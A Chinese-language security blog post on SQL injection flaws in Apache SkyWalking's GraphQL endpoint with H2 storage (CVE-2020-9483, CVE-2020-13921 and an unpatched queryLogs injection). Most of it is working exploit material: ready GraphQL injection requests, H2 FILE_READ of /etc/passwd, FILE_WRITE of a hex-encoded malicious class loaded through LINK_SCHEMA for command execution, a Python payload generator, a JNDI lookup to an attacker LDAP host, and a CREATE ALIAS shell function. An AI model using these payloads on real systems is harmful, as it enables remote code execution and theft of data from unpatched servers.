> 摘要：从skywalking的cve带入，通过skywalking的漏洞场景来了解h2数据库的注入利用方式。

Apache SkyWalking
是一款应用性能监控（APM）工具，对微服务、云原生和容器化应用提供自动化、高性能的监控方案。其官方网站显示，大量的国内互联网、银行及民航等领域的公司在使用此工具。

<https://github.com/apache/skywalking>

<https://archive.apache.org/dist/skywalking/6.6.0/apache-skywalking-apm-6.6.0-src.tgz>

<https://archive.apache.org/dist/skywalking/6.6.0/apache-skywalking-apm-6.6.0.tar.gz>

几个洞都是关于graphql注入造成的漏洞，在skywalking部署起来后访问`http://127.0.0.1:8080/graphql`会发现提供了一个graphql接口，允许使用graphql查询数据。

## 远程调试

在下载的apache-skywalking-apm-8.3.0-src.tgz的bin下找到startup.sh，能够看出skywalking由：

    
    
    OAP_EXE=oapService.sh  
    WEBAPP_EXE=webappService.sh

oap和webapp两个service组成，我们的几个漏洞都位于oap中，在oapservice.sh中，在启动语句中加入调试命令即可：

![1648520092_62426b9c54c71433ef1f9.png!small?1648520092793](https://image.3001.net/images/20220329/1648520092_62426b9c54c71433ef1f9.png!small?1648520092793)

    
    
    DEBUG_OPTIONS="-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=12346"

Ide：

![1648520113_62426bb1eb511a0c43fb8.png!small?1648520114401](https://image.3001.net/images/20220329/1648520113_62426bb1eb511a0c43fb8.png!small?1648520114401)

## skywalking中的graphql

skywalking中关于graphql的接口声明写在：

org.apache.skywalking.oap.query.graphql.GraphQLQueryProvider#prepare

![1648520132_62426bc4e3d54ee43671d.png!small?1648520133651](https://image.3001.net/images/20220329/1648520132_62426bc4e3d54ee43671d.png!small?1648520133651)

根据这些文件就能找到对应的接口。

随意抓个包就能拿到其格式：

    
    
    POST /graphql HTTP/1.1  
    Host: 172.30.3.165:8080  
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0  
    Accept: application/json, text/plain, */*  
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
    Accept-Encoding: gzip, deflate  
    Content-Type: application/json;charset=utf-8  
    Content-Length: 247  
    Origin: http://172.30.3.165:8080  
    Connection: close  
    Referer: http://172.30.3.165:8080/  
    ​  
    {"query":"query queryServices($duration: Duration!) {\n   services: getAllServices(duration: $duration) {\n     key: id\n     label: name\n   }\n }","variables":{"duration":{"start":"2022-03-04 1511","end":"2022-03-04 1526","step":"MINUTE"}}}

  

## CVE-2020-9483

> 当SkyWalking使用H2、MySQL或者TiDB作为存储方案时，攻击者可通过默认未授权的GraphQL接口构造恶意请求，从而获取敏感数据

<https://github.com/apache/skywalking/pull/4639>

Version:6.0-6.6\7.0

commit位于：<https://github.com/apache/skywalking/pull/4639/commits/2b6aae3b733f9dbeae1d6eff4f1975c723e1e7d1>

没什么好说的，主要是拼接导致的注入，漏洞点位于：`oap-server/server-storage-plugin/storage-jdbc-hikaricp-plugin/src/main/java/org/apache/skywalking/oap/server/storage/plugin/jdbc/h2/dao/H2MetricsQueryDAO.java#getLinearIntValues`:

    
    
    try (ResultSet resultSet = h2Client.executeQuery(  
    connection, "select id, " + valueCName + " from " + tableName + " where id in (" + idValues  
    .toString() + ")")) {

idValues可控，对应的查询位于：

<https://github.com/apache/skywalking-query-protocol/tree/e47462fd6af92d42d1c161cf1cec975661148ab0>

其中定义了使用方式：

    
    
    //https://github.com/apache/skywalking-query-protocol/blob/e47462fd6af92d42d1c161cf1cec975661148ab0/common.graphqls  
    input Duration {  
    start: String!  
    end: String!  
    step: Step!  
    }  
    ​  
    //https://github.com/apache/skywalking-query-protocol/blob/e47462fd6af92d42d1c161cf1cec975661148ab0/metric.graphqls  
    input MetricCondition {  
    # Metric name, which should be defined in OAL script  
    # Such as:  
    # Endpoint_avg = from(Endpoint.latency).avg()  
    # Then, `Endpoint_avg`  
    name: String!  
    # Id in this metric type.  
    # In the above case, the id should be endpoint id.  
    id: ID  
    }  
    extend type Query {  
    getValues(metric: BatchMetricConditions!, duration: Duration!): IntValues  
    getLinearIntValues(metric: MetricCondition!, duration: Duration!): IntValues  
    getThermodynamic(metric: MetricCondition!, duration: Duration!): Thermodynamic  
    }

断点调试后能发现：

![1648520168_62426be85e8196d0cc585.png!small?1648520168903](https://image.3001.net/images/20220329/1648520168_62426be85e8196d0cc585.png!small?1648520168903)

where后拼接然后直接拼接union即可完成注入：

    
    
    POST /graphql HTTP/1.1  
    Host: 172.30.3.165:8080  
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0  
    Accept: application/json, text/plain, */*  
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
    Accept-Encoding: gzip, deflate  
    Content-Type: application/json;charset=utf-8  
    Content-Length: 1451  
    Origin: http://172.30.3.165:8080  
    Connection: close  
    Referer: http://172.30.3.165:8080/  
    ​  
    {"query":"query queryData($duration: Duration!) {\n globalHeatmap: getThermodynamic(duration: $duration, metric: {\n   name: \"all_heatmap\"\n }) {\n   nodes responseTimeStep: axisYStep\n }\n globalP99: getLinearIntValues(metric: {\n   name: \"all_p99\"\n }, duration: $duration) { values { value } }\n globalP95: getLinearIntValues(metric: {\n   name: \"all_p95\"\n }, duration: $duration) { values { value } }\n globalP90: getLinearIntValues(metric: {\n   name: \"all_p90\"\n }, duration: $duration) { values { value } }\n globalP75: getLinearIntValues(metric: {name: \"all_p99\", id: \"') UNION ALL SELECT NULL,CONCAT('~', H2VERSION(), '~')--\" }, duration: $duration) { values { value } }\n globalP50: getLinearIntValues(metric: {\n   name: \"all_p50\"\n }, duration: $duration) { values { value } }\n globalBrief: getGlobalBrief(duration: $duration) {\n   numOfService numOfEndpoint numOfDatabase numOfCache numOfMQ\n }\n globalThroughput: getServiceTopN(\n   duration: $duration,\n   name: \"service_cpm\",\n   topN: 10,\n   order: DES\n ) {\n   key: id label: name value\n }\n globalSlow: getAllEndpointTopN(\n   duration: $duration,\n   name: \"endpoint_avg\",\n   topN: 10,\n   order: DES\n ) {\n   key: id label: name value\n }}","variables":{"serviceId":"","endpointId":"","endpointName":"","instanceId":"","databaseId":"","duration":{"start":"2022-03-04 1511","end":"2022-03-04 1526","step":"MINUTE"}}}

简化一下：

    
    
    {  
    "query": "query ($duration: Duration!){getLinearIntValues(metric: {name: \"all_p99\", id: \"') UNION ALL SELECT NULL,CONCAT('~', H2VERSION(), '~')--\" }, duration: $duration) { values { value } }}","variables": {  
    "duration": {  
    "start": "2022-03-04 1417",  
    "end": "2022-03-04 1418",  
    "step": "MINUTE"  
    }  
    }  
    }

比较可惜的是此处使用的是executeQuery，往里深入会发现是调用的prepareStatement，无法执行堆叠注入。

ps.堆叠注入通常用的是addBatch 和 executeBatch 这两个函数。

## CVE-2020-13921及最新的注入

<https://github.com/apache/skywalking/pull/4970>

ver:6.5.0, 6.6.0, 7.0.0, 8.0.0, 8.0.1

涉及到的类比较多，还是拼接导致的注入：

![1648520196_62426c04e69261b4743f5.png!small?1648520197475](https://image.3001.net/images/20220329/1648520196_62426c04e69261b4743f5.png!small?1648520197475)

以org.apache.skywalking.oap.server.storage.plugin.jdbc.h2.dao.H2MetadataQueryDAO#searchServices为例，其graphqls如下：

    
    
    searchServices(duration: Duration!, keyword: String!): [Service!]!

![1648520218_62426c1a5b2a682fad44b.png!small?1648520219033](https://image.3001.net/images/20220329/1648520218_62426c1a5b2a682fad44b.png!small?1648520219033)

以此构造出poc如下：

    
    
    {  
    "query": "query ($duration: Duration!,$keyword: String!){searchServices(duration: $duration,keyword:$keyword) {key: id,label: name}}","variables": {  
    "duration": {  
    "start": "2022-03-04 1417",  
    "end": "2022-03-04 1418",  
    "step": "MINUTE"  
    },  
    "keyword":"123"  
    }  
    }

注入点位于keyword，sql语句变为：

    
    
    select * from service_inventory where ( (heartbeat_time >= ? and register_time <= ? ) or (register_time <= ? and heartbeat_time >= ? ) ) and is_address=? and name like "%123%" limit 5000

不过处于like字段不太方便注入，在此处尝试注入总是Column "%" not found。

然而官方对于上面注入的修复不完善，还存在着一处queryLog注入，漏洞点位于org.apache.skywalking.oap.server.storage.plugin.jdbc.h2.dao.H2LogQueryDAO#queryLogs：

![1648520257_62426c4100dca4f8429c3.png!small?1648520257560](https://image.3001.net/images/20220329/1648520257_62426c4100dca4f8429c3.png!small?1648520257560)

对于metricName做了拼接，而关于querylog的用法在log.graphqls中有:

    
    
    type Log {  
    serviceName: String  
    serviceId: ID  
    serviceInstanceName: String  
    serviceInstanceId: ID  
    endpointName: String  
    endpointId: ID  
    traceId: String  
    timestamp: String!  
    isError: Boolean  
    statusCode: String  
    contentType: ContentType!  
    content: String  
    }  
    ​  
    input LogQueryCondition {  
    # Metric name of the log records  
    metricName: ID  
    # The value of 0 means all services.  
    serviceId: ID  
    serviceInstanceId: ID  
    endpointId: ID  
    traceId: String  
    # The time range of log happened  
    queryDuration: Duration  
    state: LogState!  
    stateCode: String  
    paging: Pagination!  
    }  
    ​  
    extend type Query {  
    queryLogs(condition: LogQueryCondition): Logs  
    }

以此构造poc，需要注意的是后面使用预编译，而在注入时需要注释掉后续拼接上的占位符，因此需要手动加上俩占位符：

    
    
    {  
    "query": "query ($condition: LogQueryCondition) {   queryLogs(condition: $condition) {       logs{   content   } }}",  
    "variables": {  
    "condition": {  
    "metricName": "INFORMATION_SCHEMA.USERS) union SELECT CONCAT('~', H2VERSION(), '~') where ?=1 or ?=1 or 1=1--",  
    "paging": {  
    "pageNum": 1,  
    "pageSize": 1  
    },  
    "state": "ALL",  
    "queryDuration": {  
    "start": "2021-02-07 1554",  
    "end": "2021-02-07 1554",  
    "step": "MINUTE"  
    }  
    }  
    }  
    }

## h2注入的进一步利用

h2注入的利用思路比较多，因为skywalking是以sa权限启动的h2，所以各种需要权限的函数都可以使用。

读文件的函数FILE_READ：

    
    
    SELECT FILE_READ('/etc/passwd', NULL)

![1648520313_62426c7980671908d579a.png!small?1648520314497](https://image.3001.net/images/20220329/1648520313_62426c7980671908d579a.png!small?1648520314497)

能读就能写，文件写入函数为FILE_WRITE：

    
    
    SELECT FILE_WRITE('00000074000000650000007300000074', 'hello.txt')

ps.此处需要写入的是16进制的文件内容。

getshell的方式也有，除了常规的利用写文件到定时任务或者其他我不了解的姿势之外，还有利用h2内置的函数link_schema。

首先，通过写文件我们可以写入恶意类，但还需要对该恶意类进行加载才能达成执行代码的效果，而link_schema函数的第二个参数在底层有加载类的效果。

![1648520336_62426c90950fd964aec17.png!small?1648520337128](https://image.3001.net/images/20220329/1648520336_62426c90950fd964aec17.png!small?1648520337128)

从这里跟入后能看到具体代码，具体在：org.h2.util.JdbcUtils#loadUserClass，没啥好说的，就是最后调用了Class.forName。

![1648520354_62426ca23a3fb1b9b21d3.png!small?1648520355154](https://image.3001.net/images/20220329/1648520354_62426ca23a3fb1b9b21d3.png!small?1648520355154)

那么这里就可以将我们写入的恶意类进行加载了。

    
    
    {  
    "query": "query queryLogs($condition: LogQueryCondition) {\n   queryLogs(condition: $condition) {\n       logs{\n   content   }\n }}",  
    "variables": {  
    "condition": {  
    "metricName": "(select 1 where ?=1 or ?=1 or SELECT FILE_WRITE('cafebabe0000003a00200a000200030700040c000500060100106a6176612f6c616e672f4f626a6563740100063c696e69743e0100032829560a0008000907000a0c000b000c0100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b08000e0100126f70656e202d612063616c63756c61746f720a000800100c0011001201000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0700140100136a6176612f6c616e672f5468726f7761626c650a001300160c0017000601000f7072696e74537461636b547261636507001901000445787031010004436f646501000f4c696e654e756d6265725461626c650100083c636c696e69743e01000d537461636b4d61705461626c6501000a536f7572636546696c65010009457870312e6a6176610021001800020000000000020001000500060001001a0000001d00010001000000052ab70001b100000001001b000000060001000000010008001c00060001001a0000004f0002000100000012b80007120db6000f57a700084b2ab60015b1000100000009000c00130002001b0000001600050000000400090007000c0005000d000600110008001d0000000700024c070013040001001e00000002001f', '../config/Exp1.class'))) --",  
    "paging": {  
    "pageNum": 1,  
    "pageSize": 1,  
    "needTotal": true  
    },  
    "state": "ALL",  
    "queryDuration": {  
    "start": "2021-02-07 1554",  
    "end": "2021-02-07 1609",  
    "step": "MINUTE"  
    }  
    }  
    }  
    }

需要注意的是写入的路径根据实际可写路径变化，不一定是config。

加载：

    
    
    {  
    "query": "query queryLogs($condition: LogQueryCondition) {\n   queryLogs(condition: $condition) {\n       logs{\n   content   }\n }}",  
    "variables": {  
    "condition": {  
    "metricName": "(select 1 where ?=1 or ?=1 or LINK_SCHEMA('file', 'Exp1', 'test', 'sa', 'sa', 'PUBLIC'))) --",  
    "paging": {  
    "pageNum": 1,  
    "pageSize": 1,  
    "needTotal": true  
    },  
    "state": "ALL",  
    "queryDuration": {  
    "start": "2021-02-07 1554",  
    "end": "2021-02-07 1609",  
    "step": "MINUTE"  
    }  
    }  
    }  
    }

由于类加载机制（双亲委派机制）导致加载过的类无法再次加载，因此每次都需要创建一个不同的类名进行加载，同时将写入evi类和加载放一起，简单地写了一个生成脚本：

    
    
    import random  
    import os  
    code = """  
    public class %s {  
    static {  
    try {  
    Runtime.getRuntime().exec("%s");  
    } catch (Throwable e) {  
    e.printStackTrace();  
    }  
    }  
    }  
    """  
    name = "A"+str(int(random.random()*100000))  
    exp = "open -a calculator"  
    ​  
    code = code%(name,exp)  
    with open(name+".java","w") as f:  
    f.write(code)  
    ​  
    os.system("javac "+name+".java")  
    ​  
    bc = ""  
    ​  
    with open(name+".class","rb") as f:  
    for i in f.read():  
    if len(str(hex((i))))<4:  
    bc += "0"+str(hex((i))).replace("0x","")  
    else:  
    bc += str(hex((i)))[2:4]  
    ​  
    # print(bc)  
    ​  
    ​  
    ​  
    ​  
    gqll = """  
    {  
    "query": "query queryLogs($condition: LogQueryCondition) {\n   queryLogs(condition: $condition) {\n       logs{\n   content   }\n }}",  
    "variables": {  
    "condition": {  
    "metricName": "(select 1 where ?=1 or ?=1 or SELECT FILE_WRITE('%s', '../config/%s.class') and LINK_SCHEMA('file', '%s', 'test', 'sa', 'sa', 'PUBLIC'))) --",  
    "paging": {  
    "pageNum": 1,  
    "pageSize": 1,  
    "needTotal": true  
    },  
    "state": "ALL",  
    "queryDuration": {  
    "start": "2021-02-07 1554",  
    "end": "2021-02-07 1609",  
    "step": "MINUTE"  
    }  
    }  
    }  
    }"""%(bc,name,name)  
    ​  
    os.system("rm -rf %s %s"%(name+".java",name+".class"))  
    print(gqll.replace("\n",""))

往sw一丢就触发calc了。

在尝试成功加载完恶意类后再看回到前面的link_schema底层代码，会发现有意思的东西（lookup）：

![1648520399_62426ccf1f80a7fa278be.png!small?1648520399698](https://image.3001.net/images/20220329/1648520399_62426ccf1f80a7fa278be.png!small?1648520399698)

很熟悉的东西，一看见lookup就立马会联想到jndi，是否可以直接利用jndi注入？答案是可以的。

var1实际上是link_schema的第三个参数，也就是数据库的连接串，第二个参数放入`javax.naming.InitialContext`，此时可以用lookup来发起连接。

    
    
    {  
    "query": "query queryLogs($condition: LogQueryCondition) {\n   queryLogs(condition: $condition) {\n       logs{\n   content   }\n }}",  
    "variables": {  
    "condition": {  
    "metricName": "(select 1 where ?=1 or ?=1 or LINK_SCHEMA('file', 'javax.naming.InitialContext', 'ldap://vps:port/Exploit', 'sa', 'sa', 'PUBLIC'))) --",  
    "paging": {  
    "pageNum": 1,  
    "pageSize": 1,  
    "needTotal": true  
    },  
    "state": "ALL",  
    "queryDuration": {  
    "start": "2021-02-07 1554",  
    "end": "2021-02-07 1609",  
    "step": "MINUTE"  
    }  
    }  
    }  
    }

在CVE-2020-9483时有提到过堆叠注入，sw的几处注入最后都是用executeQuery->prepareStatement，不满足堆叠的条件，既然提到了那么就顺带看一下在允许堆叠注入的情况下h2db的getshell方式。

CREATE ALIAS创建函数$$内为函数定义:

    
    
    CREATE ALIAS SHELLEXEC4 AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter('\\\\A'); if(s.hasNext()){return s.next();}else{return '';} }$$;CALL SHELLEXEC4('id');

最后用call去调用函数达成命令执行。

## ref

<https://www.anquanke.com/post/id/231753>

<https://www.sec-in.com/article/827>

<https://xz.aliyun.com/t/9217>

<https://xz.aliyun.com/t/9202>

